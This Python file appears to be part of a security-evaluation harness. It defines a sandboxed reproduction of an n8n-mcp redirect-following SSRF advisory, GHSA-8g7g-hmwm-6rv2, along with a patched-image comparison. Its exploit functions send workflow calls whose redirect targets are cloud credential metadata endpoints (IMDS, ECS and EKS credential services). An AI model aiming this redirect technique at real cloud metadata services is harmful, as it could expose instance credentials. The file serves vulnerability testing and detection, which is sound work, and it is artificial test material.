"""GHSA-8g7g-hmwm-6rv2: n8n-mcp redirect-following SSRF reaching internal_fetch (CWE-918).

The server under test is the real n8n-mcp, installed from npm. Its n8n_test_workflow tool first
loads a workflow from the configured n8n instance (GET /api/v1/workflows/<id>), confirms it is an
active webhook workflow, then fetches baseUrl + "/webhook/<webhookPath>" with an axios client whose
maxRedirects defaults to following 3xx (and re-adds the call's `data` as the GET query string).
2.50.1 sets maxRedirects: 0. A webhook URL whose origin passes validateWebhookUrl but 302-redirects
to an internal host is therefore followed on 2.50.0 and stopped on 2.50.1, and the redirect
target's body is returned to the caller: reach = internal_fetch.

The instance N8N_API_URL points at is the real n8n, provisioned for each launch with one active
webhook workflow whose Respond to Webhook node answers with a 302 to the request's `u` query
parameter (`evals/cve/backends/n8n_instance.py`). The webhook is the endpoint the published SSRF
puts under the attacker's control, and the redirect target is the exploit call's own `data.u`. The
internal targets are the frozen-list http_endpoint sentinels. n8n never fetches the redirect target
itself, so the nonce surfaces only through n8n-mcp following the redirect.
"""

import re
from collections.abc import Awaitable, Callable
from pathlib import Path

from evals.cve.backends import n8n_instance
from evals.cve.backends.n8n_instance import (
    N8N_INSTANCE_IP,
    N8N_PORT,
    WEBHOOK_PATH,
    provisioned_workflow_id,
)
from evals.cve.detection.holdout_environments import ssrf_redirect_env
from evals.cve.detection.targets import Target
from evals.cve.grammar import FlawClass
from evals.cve.places import Places
from evals.cve.planting import PlantingHost, SymbolicUser
from mcp_auditor.domain.ports import MCPClientPort

AIM = re.compile(r"169\.254\.\d{1,3}\.\d{1,3}")

# The three plantable internal_fetch endpoints of the frozen list (the others are unplaceable).
KEPT_PLACES: tuple[str, ...] = ("imds", "ecs-task-credentials", "eks-pod-identity")

# A benign redirect target: n8n's own health endpoint, a public-range host, not an internal link.
BENIGN_TARGET = f"http://{N8N_INSTANCE_IP}:{N8N_PORT}/healthz"


def _trigger(redirect_target: str) -> dict[str, object]:
    return {
        "workflowId": provisioned_workflow_id(),
        "triggerType": "webhook",
        "httpMethod": "GET",
        "webhookPath": WEBHOOK_PATH,
        "data": {"u": redirect_target},
        "waitForResponse": True,
    }


def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
    async def run(places: Places, client: MCPClientPort) -> None:
        place = places[place_id]
        target = f"http://{place.coordinates.host}{place.coordinates.path}"
        await client.call_tool("n8n_test_workflow", _trigger(target))

    return run


async def _benign(places: Places, client: MCPClientPort) -> None:
    await client.call_tool("n8n_test_workflow", _trigger(BENIGN_TARGET))


TARGET = Target(
    flaw_id="GHSA-8g7g-hmwm-6rv2",
    severity="CVSS 7.5 (v3.1, placeholder)",
    classes=frozenset({FlawClass.INTERNAL_FETCH}),
    aim=AIM,
    reaches=frozenset({"internal_fetch"}),
    kept_places=KEPT_PLACES,
    images=(
        "holdout-ghsa-8g7g-hmwm-6rv2-n8n",
        "sentinel",
        "holdout-ghsa-8g7g-hmwm-6rv2-n8n-redirect",
    ),
    server_image="holdout-ghsa-8g7g-hmwm-6rv2-n8n",
    patched_image="holdout-ghsa-8g7g-hmwm-6rv2-n8n-patched",
    planting_host=PlantingHost(
        user=SymbolicUser.UNPRIVILEGED, working_directory="/srv/app", has_network=False
    ),
    builder=ssrf_redirect_env,
    exploits=tuple(_exploit(place_id) for place_id in KEPT_PLACES),
    benign=_benign,
    awaited_capability=None,
    note=(
        "Redirect-following SSRF (CWE-918): n8n_test_workflow validates the webhook URL's origin "
        "but follows a 302 to an internal host without re-validating it, fetching the redirect "
        "target and returning its body."
    ),
    tools_filter=None,
    backend_sources=(Path(n8n_instance.__file__),),
)
